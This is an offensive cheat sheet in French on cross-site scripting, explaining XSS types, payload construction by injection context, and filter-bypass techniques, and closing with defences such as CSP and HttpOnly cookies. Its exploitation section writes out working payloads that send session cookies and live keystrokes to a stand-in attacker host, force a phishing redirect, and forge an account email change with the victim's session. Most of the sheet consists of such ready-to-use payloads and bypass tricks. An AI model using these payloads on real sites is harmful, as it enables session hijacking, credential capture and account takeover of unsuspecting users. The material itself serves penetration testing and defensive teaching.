# Cross-Site Scripting (XSS) — cheat sheet offensive

Cheat sheet sur les typologies, l'exploitation et la remédiation des failles XSS.

!!! warning "Cadre légal"
    Ces techniques ne doivent être mises en œuvre que dans un cadre légal explicite : laboratoire, CTF, ou test d'intrusion couvert par une autorisation écrite.

---

## Typologies & mécanismes

| Type | Persistance | Mécanisme |
|---|---|---|
| **Reflected** | Non persistant | Le payload transite dans une requête (URL, formulaire) et est renvoyé tel quel dans la réponse HTTP |
| **Stored** | Persistant | Le payload est enregistré côté serveur (base de données, fichier) et rejoué à chaque affichage, pour tous les utilisateurs |
| **DOM-Based** | Variable | Le payload n'est jamais transmis au serveur ; l'exécution provient d'une manipulation JavaScript côté client |

### Reflected XSS

```text
https://site.com/search?q=<script>alert(document.domain)</script>
# Le paramètre q est réinjecté sans échappement dans la page de résultats
```

### Stored XSS

```text
Champ "commentaire" d'un blog : <script>alert(document.domain)</script>
# Exécuté pour chaque visiteur consultant la page contenant ce commentaire
```

!!! warning "Impact démultiplié"
    Une XSS stockée touche potentiellement l'ensemble des utilisateurs consultant la ressource compromise, y compris des comptes à privilèges élevés (administrateurs, modérateurs).

### DOM-Based XSS

Repose sur le flux **Source → Sink** en JavaScript, sans passer par le serveur.

| Rôle | Exemples |
|---|---|
| **Source** (donnée contrôlable) | `location.search`, `location.hash`, `document.referrer`, `window.name` |
| **Sink** (point d'exécution dangereux) | `innerHTML`, `document.write()`, `eval()`, `setTimeout()` avec chaîne |

```js
// Sink vulnérable : innerHTML n'échappe pas le HTML injecté
document.getElementById("result").innerHTML = location.search;
```

!!! tip "Identifier une DOM-based XSS"
    Recherchez dans le code JavaScript client toute donnée issue d'une source contrôlable par l'attaquant qui atteint un sink sans passer par une fonction d'échappement (`textContent`, `encodeURIComponent`).

---

## Contextes d'injection & construction de payloads

### Injection HTML standard

```html
<script>alert(document.domain)</script>
<!-- Payload classique, souvent filtré en premier par les protections basiques -->

<img src=x onerror=alert(document.domain)>
<!-- Déclenche l'événement onerror si l'image src=x échoue à charger -->

<svg/onload=alert(document.domain)>
<!-- SVG auto-fermant, évite le mot-clé "script" -->
```

### Injection dans un attribut HTML

```html
" onmouseover="alert(document.domain)
<!-- Sort de la valeur d'attribut pour injecter un gestionnaire d'événement -->

" autofocus onfocus="alert(document.domain)
<!-- autofocus déclenche onfocus sans interaction utilisateur -->
```

### Injection au sein d'un bloc JavaScript

```js
'; alert(document.domain); //
// Ferme la chaîne courante, injecte une instruction, commente le reste de la ligne

`-alert(document.domain)-`
// Exploite un contexte de template literal ou d'expression arithmétique
```

!!! tip "Adapter le payload au contexte"
    Un payload conçu pour un contexte HTML échoue généralement dans un contexte attribut ou JavaScript. Identifiez précisément où votre entrée est reflétée (balise, attribut, script) avant de construire le payload.

---

## Scénarios d'exploitation & impact

### Vol de cookies de session

```js
document.location='https://attaquant.com/steal?c='+document.cookie
// Exfiltre le cookie de session vers un serveur contrôlé par l'attaquant

new Image().src='https://attaquant.com/steal?c='+document.cookie
// Variante discrète via une requête image, sans redirection visible
```

!!! warning "Limite : HttpOnly"
    Un cookie marqué `HttpOnly` n'est pas accessible via `document.cookie`, ce qui neutralise ce vecteur de vol direct — mais n'empêche pas les autres impacts (keylogging, défacement, actions forgées).

### Keylogging, défacement, redirections

```js
document.addEventListener('keypress', function(e) {
  fetch('https://attaquant.com/log?k=' + e.key);
});
// Capture chaque frappe clavier et l'exfiltre en temps réel

document.body.innerHTML = '<h1>Site compromis</h1>';
// Défacement dynamique du contenu affiché

window.location = 'https://site-pirate.com/phishing';
// Redirection forcée vers une page de phishing
```

### Actions forgées au nom de la victime

```js
fetch('/account/email/change', {
  method: 'POST',
  credentials: 'include',
  body: 'newEmail=attaquant@evil.com'
});
// Utilise la session active de la victime pour modifier son compte
```

!!! tip "XSS comme vecteur de CSRF"
    Une XSS contourne intégralement les protections CSRF classiques (token anti-CSRF) puisque le script s'exécute dans le contexte légitime de la victime et peut lire ce token avant de forger sa requête.

---

## Bypass de filtres & obscurcissement

### Événements alternatifs

| Événement | Déclencheur |
|---|---|
| `onerror` | Échec de chargement d'une ressource (image, script) |
| `onload` | Chargement réussi d'une ressource ou de la page |
| `ontoggle` | Ouverture/fermeture d'un élément `<details>` |
| `onpointerenter` | Survol par le pointeur, sans nécessiter de clic |

```html
<details open ontoggle=alert(document.domain)>
<!-- ontoggle se déclenche automatiquement grâce à l'attribut open -->
```

### Encodage et obscurcissement

```html
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
<!-- Encodage HTML Entities, utile si le filtre décode avant validation -->

<script>\u0061lert(1)</script>
<!-- Encodage Unicode d'un caractère au sein du nom de fonction -->
```

!!! tip "JSFuck"
    JSFuck encode n'importe quel JavaScript en une combinaison des six caractères `[]()!+`, produisant un code fonctionnellement identique mais totalement illisible pour un filtre basé sur des signatures de mots-clés.

### Contournement des filtres par mots-clés

```js
window['eval']('alert(1)')
// Accès dynamique à eval via la notation crochet, évite le mot-clé littéral

Function('alert(1)')()
// Function agit comme un eval alternatif, souvent absent des listes noires

top['al'+'ert'](1)
// Concaténation de chaînes pour reconstruire le nom de la fonction ciblée
```

!!! warning "Les blacklists sont contournables par construction"
    Toute liste noire de mots-clés reste fondamentalement incomplète face à un langage aussi dynamique que JavaScript, où quasiment chaque fonction est accessible par un chemin alternatif.

---

## Défense & protection

| Mesure | Principe |
|---|---|
| **Context-Aware Output Encoding** | Échapper la sortie selon son contexte précis (HTML, attribut, JS, URL) plutôt qu'un échappement générique unique |
| **Content Security Policy (CSP)** | Restreint les sources de script autorisées, neutralisant l'exécution même en cas d'injection réussie |
| **Cookie `HttpOnly`** | Empêche l'accès au cookie via JavaScript, limitant l'impact d'une XSS sur le vol de session |
| **Cookie `SameSite`** | Limite l'envoi du cookie dans les requêtes cross-site, en défense complémentaire contre le CSRF déclenché |

```text
Content-Security-Policy: default-src 'self'; script-src 'self'
# Bloque tout script inline ou chargé depuis un domaine externe non autorisé
```

!!! tip "Défense en profondeur"
    Aucune mesure seule n'est suffisante. L'échappement contextuel neutralise l'injection à la source, la CSP limite les dégâts en cas d'échec de l'échappement, et `HttpOnly`/`SameSite` réduisent l'impact résiduel sur les sessions.

---

## Voir aussi

- OWASP XSS Prevention Cheat Sheet
- Fiche complémentaire : `sqli.md` pour les injections côté base de données
